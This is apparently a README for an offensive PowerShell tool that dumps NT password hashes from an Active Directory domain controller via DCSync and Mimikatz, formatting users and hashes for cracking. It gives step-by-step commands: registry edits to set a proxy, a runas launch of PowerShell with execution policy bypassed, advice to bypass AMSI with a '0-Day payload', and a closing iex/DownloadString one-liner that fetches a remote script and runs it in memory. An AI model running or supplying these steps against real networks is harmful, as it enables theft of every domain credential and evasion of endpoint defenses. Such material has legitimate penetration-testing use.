# Invoke-DCSync
PowerShell script to DCSync NT-Hashes from an Active Directory Domain Controller (DC) via Mimikatz. 

Output format is split into 4 files:
- raw mimikatz log
- hashes only
- users only 
- tuple list of user and hash for cracking

## General Preparation

1. Connect to the internal AD network via VPN or directly, if on-site.
2. Configure your operating system's proxy to use the client's proxy. Internet is required to download Invoke-Mimikatz and Invoke-DCSync PS scripts. Alternatively, configure a known proxy via PS:

````
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyServer -Value "127.0.0.1:8080"
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 1
````
3. Open a new PowerShell terminal as another user; use a privileged domain user account with DCSync rights

````
runas.exe /netonly /noprofile /user:mydomain.prod.dom\dcsyncUser "powershell.exe -ep bypass"
````

4. Verify authenticated AD access within your PowerShell terminal window

## DCSync Preparation

It is recommended to bypass AMSI for the current PowerShell session. Use a 0-Day payload!

# DCSync Execution

Download ``Invoke-DCSync.ps1`` into memory, which executes the DCSync process.

As a result, we will obtain four files located under C:\temp\ directory:

1. **DCSync_NTLM_full**: Just the complete logfile of running Mimikatz
2. **DCSync_NTLM_Hashes**: Only contains the NT-Hashes
3. **DCSync_NTLM_Users**: Only contains the employee's username
4. **DCSync_NTLM_UserHash_Import**: Contains the tuple of username and hash

````
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/Invoke-SPNDCSync/main/Invoke-SPNDCSync.ps1')
````
